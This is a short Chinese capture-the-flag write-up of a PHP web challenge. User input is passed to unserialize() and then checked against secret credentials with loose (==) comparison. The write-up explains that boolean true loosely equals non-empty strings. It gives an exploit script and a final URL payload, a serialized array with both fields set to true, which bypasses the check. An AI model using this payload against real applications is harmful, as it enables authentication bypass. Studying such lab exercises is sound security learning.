---
tags:
  - "#web"
  - "#反序列化"
  - "#弱比较"
  - "#布尔函数"
title:
author: 冰冰洁
date: 2026-09-23 11:00
---
## 题目描述

```php
<?php
show_source(__FILE__);   
$username  = "this_is_secret";
$password  = "this_is_not_known_to_you";    include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;   $data_unserialize = unserialize($info);   if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){       
   echo $flag;   }
else{
       echo "username or password error!";      }
?>  // username or password error!
```

这个题目要求我们输入的username等于他指定的内容，但是在代码第五行题目将两个变量的值修改了我们并不知道是多少。

但是注意到这里的比较条件是弱比较，因此可以通过**PHP 弱比较（`==`）中，如果比较双方有一方是布尔值 `true`，另一方会被转换为布尔值进行比较，因此只要另一方也被转换为 `true`，最终比较结果就是 `true`。** 来绕过

## exp

```php
<?php 
$a = [
'username' => true,
'password' => true
];
$info = serialize($a);
echo $info;
?>
```

最终payload:

```
?info=a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```
